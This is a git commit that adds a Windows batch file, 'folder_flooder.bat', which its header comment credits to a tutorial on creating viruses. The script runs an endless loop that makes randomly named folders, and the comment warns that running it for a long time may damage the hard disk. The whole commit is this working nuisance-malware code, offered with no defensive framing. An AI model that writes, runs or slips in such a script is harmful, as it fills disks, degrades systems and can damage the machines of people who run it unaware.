7f793d62dc3a1b5702e4ddb955f9b398fcab4062
Minhas Kamal <minhaskamal024@gmail.com>
2016-12-22 20:04:50 +0600

    Creates a lot of folders on the disk.

---
+++ folder_flooder.bat
@@ -0,0 +1,6 @@
+:: Source- http://www.explorehacking.com/2011/01/batch-files-art-of-creating-viruses.html
+:: Creates a lot of folders on the disk. Running it for long time may crush hard-disk.
+
+:x
+md %random%%random%
+goto x
